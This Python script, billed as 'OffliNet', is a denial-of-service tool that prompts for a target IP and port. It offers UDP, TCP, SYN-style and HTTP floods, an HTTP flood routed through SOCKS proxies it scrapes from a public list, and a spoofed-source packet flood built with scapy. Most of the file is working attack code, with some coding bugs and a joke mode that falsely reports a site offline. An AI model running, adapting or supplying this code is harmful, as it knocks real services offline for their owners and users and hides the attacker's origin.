import random, sys, threading, time, urllib.request, os
try:
    import socks, socket
except:
    print ('Downloading required libraries and modules...')
    print ('This is the download window for pysocks module it is not a problem it is previewed!')
    if sys.platform =="linux":
        pip= int(input('Do you have pip module?(1=Yes, 2=No):'))
        if pip==1:
            pass
        if pip==2:
            os.system('apt-get install python3-pip')
        os.system('pip3 install pysocks')
    else:
        os.system('py -m pip install pysocks')
    import socks,socket
print ("§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§")
print ("§§§§§§§§§§§§§§§§§§Welcome to OffliNet Coded by ScriptMan§§§§§§§§§§§§§§§§§§§§§§§")
print ("###############################################################################")
Metodo = __name__
if sys.platform =="linux":
    try:
        from scapy.all import *
    except:
        os.system('pip3 install scapy-python3')
        from scapy.all import *
    print ('If you saw some errors up of this message about tcpdump and IPV6 do not worry about it these will not improve the performance or the running of OffliNet')
    print ('Remember you must run this program as root for spoofed flood packed')
    Metodo=int(input('DoS Mode (1=UDP Flood, 2= Syn Flood, 3=HTTP Flood, 4= HTTP Proxed Flood, 5= TCP Flood, 6= Spoofed Packed Flooder):'))
else:
    print ('I am sorry but in this OS spoofed packed flood is not enabled')
    Metodo=int(input('DoS Mode (1=UDP Flood, 2= Syn Flood, 3=HTTP Flood, 4= HTTP Proxed Flood, 5= TCP Flood):'))
if Metodo == 1:
    print ("UDP FLOOD:")
    ip=input('Target ip:')
    port=int(input('Target port:'))
    size=int(input('Packet Size:'))
    packets=int(input('Threads:'))

    class udpFlood(threading.Thread):
        def __init__(kill, ip, port, size, packets):
            kill.ip = ip
            kill.port = port
            kill.size = size
            kill.packets = packets
            for i in range(kill.packets):
                kill.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                threading.Thread.__init__(kill)

        def run(kill):
            while True:
                try:
                    bytes = random._urandom(kill.size)
                    if kill.port == 0:
                        kill.port = random.randrange(1, 65535)
                    kill.udp.sendto(bytes,(kill.ip, kill.port))
                    print ("UDP Flooding...")
                except:
                    print ('Error')
    if Metodo == 1:
        flood= udpFlood(ip, port, size, packets)
        flood.run()
if Metodo == 2:
    print ("Syn Flood:")
    ip = input('Target ip: ')
    port = int(input('Target port: '))
    number = int(input('Number of Syn Connections: '))
     
    def connect(ip, port):
        for i in range(number):
            s = socket.socket()
            print ('Charging Connections..')
        try:
            s.connect((ip, port))
            print ('Syn Flooding...')
            s.close()
        except:
            print ('Maybe the door you choose is closed or maybe the IP is wrong')
if Metodo == 2:
        while True:
            t = threading.Thread(target=connect, args=(ip,port))
            t.start()
if Metodo == 3:
    print ("HTTP Flood (Not Proxed):")
    url= input("Target Ip:")
    host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
    urlport= int(input("Target Port:"))
    thread= int(input("Threads:"))
    useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
                        "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
			"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
    def randomizeUserAgent():
       return random.choice(userAgents)
    def randomizeIp():
        random.seed()
        result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
        result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
        return result
    def randomizeIps():
        random.seed()
        ris = ""
        for ip in range(random.randint(2, 8)):
            ris = ris + randomizeIp() + ", "
        return ris[0:len(ris) - 2]

    class attack(threading.Thread):
        def run(self):
            forward = "X-Forwarded-For: " + randomizeIps() + "\r\n"
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
            connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
            acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
            accept = random.choice(acceptall) 
            request = get_host + useragent + accept + connection + "\r\n" 
            while True:                                                                                                                                                               #rip: for i in range(thread):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                    s.connect((str(url), int(urlport)))
                    s.send (str.encode(request)) 
                    print ("Http Request Sent!") 
                except:
                    pass
    if __name__ == '__main__':
       for i in range(thread):
          attack().start()
          print ("Sending Threads.....!")
          
if Metodo == 4:
    urlproxy= "https://www.socks-proxy.net/"
    useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
    		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    		"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
    		"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
    		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	    	"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
    		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	    	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
	    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
	    	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
    print ("Downoading Proxy:")
    def proxydownload():
        req = urllib.request.Request(("%s") % (urlproxy))
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = str(sourcecode.read())
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>")
            try:
                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        out_file = open("proxy.txt","w")
        out_file.write("")
        out_file.write(proxies)
        out_file.close()
        print ("Proxy downloaded!")
    def timer():
        threading.Timer(600, timer).start()
        proxydownload()
    timer()
    print ("HTTP Flood proxed (Ricordo funzionano solo Socks proxy):")
    url= input("Target Ip:")
    host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
    out_file = str(input("Enter the proxylist filename(standard is:proxy.txt): "))
    if out_file== "":
        out_file= "proxy.txt"
    urlport= int(input("Target Port:"))
    thread= int(input("Threads:"))
    def randomizeUserAgent():
       return random.choice(userAgents)
    def randomizeIp():
        random.seed()
        result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
        result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
        return result
    def randomizeIPs():
        random.seed()
        ris = ""
        for ip in range(random.randint(2, 8)):
            ris = ris + randomizeIp() + ", "
        return ris[0:len(ris) - 2]
    proxies = open(out_file).readlines()
    class attack(threading.Thread):
        def run(self):
            forward = "X-Forwarded-For: " + randomizeIPs() + "\r\n"
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
            connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
            acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
            accept = random.choice(acceptall) 
            request = get_host + useragent + accept + connection + "\r\n"
            proxy = random.choice(proxies).strip().split(":")
            while True:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
                    s = socks.socksocket()
                    s.connect((str(url) , int(urlport)))
                    s.send(str.encode(request))
                    print ("Http Request Sent!") 
                except:
                    s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
                    s = socks.socksocket()
                    s.connect((str(url) , int(urlport)))
                    s.send(str.encode(request))
                    print ("Http Request Sent!")
                except:
                    pass 
    if __name__ == '__main__':
       for i in range(thread):
          attack().start()
          print ("Sending Threads.....!")
if Metodo == 5:
    print ("TCP Flood:")
    ip=input('Ip Vittima:')
    port=int(input('Porta:'))
    size=int(input('Peso:'))
    packets=int(input('Threads:'))
    class tcpFlood(threading.Thread):
        def __init__(kill, ip, port, size, packets):
            kill.ip = ip
            kill.port = port
            kill.size = size
            kill.packets = packets
            for i in range(kill.packets):
                kill.tcp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                threading.Thread.__init__(kill)

        def run(kill):
             while True:
                try:
                    bytes = random._urandom(kill.size)
                    if kill.port == 0:
                        kill.port = random.randrange(1, 65535)
                    kill.tcp.connect((kill.ip, kill.port))
                    kill.tcp.sendto(bytes,(kill.ip, kill.port))
                    print ("Tcp Flooding...")
                except:
                    print ('Maybe the door you choose is closed or maybe the IP is wrong')
    if __name__ == '__main__':
        flood= tcpFlood(ip, port, size, packets)
        flood.run()
if Metodo == 6:
    if sys.platform =="linux":
        if os.getuid() != 0:
            print ('Sorry but spoofed flood is runnable only with root permissions')
        else:
            sip = input('Choose the packet fake source ip:') # fake spoofed Ip adress
            tip = input('Target Ip:') #destination Ip
            sp = int(input('Choose the packet fake source port:')) #source fake spoofed port
            tp = int(input('Target Port:')) #destination port
            packets = int(input('Packets:'))
            payload = ("yeahyeahyeah") #packet payload
            for i in range(packets):
                spoofed_packet = (IP(src=sip, dst=tip) / TCP(sport=sp, dport=tp) / payload)
            for i in range(packets):
                send(spoofed_packet)
    else:
        print ('Your OS does not support packed spoofed flood')

#EasterEgg
if Metodo == 7:
    print ("§§§§Raggio Finale Distruttivo§§§§")
    ip=input('Target Ip:')
    port=int(input('Target Port:'))
    size=int(input('Packet size:'))
    packets=int(input('Threads:'))
    language=int(input('Language(En=0, It= 1):'))
    print ("*****The Final DoSser****")
    if language == 0:
        print ("The website will go down in 20 seconds or less!")
        print ("Charging Photonic Rays...")
        time.sleep(2)
        for i in range(packets):
            print ("Sending Phtonic Rays....")
        print ("Website is offline!! If the tool don't work turn off your Wifi and reload the webpage!")
    if language == 1:
        print ("Il sito andrà giù in 20 secondi... nemmeno!")
        print ("Caricando raggi fotonici.....")
        time.sleep(2)
        for i in range(packets):
            print ("Mandando Raggi Fotonici....")
        print ("Il sito è offline!! Se il tool ancora non funziona spegni la tua connessione e aggiorna la pagina!")   
        
    

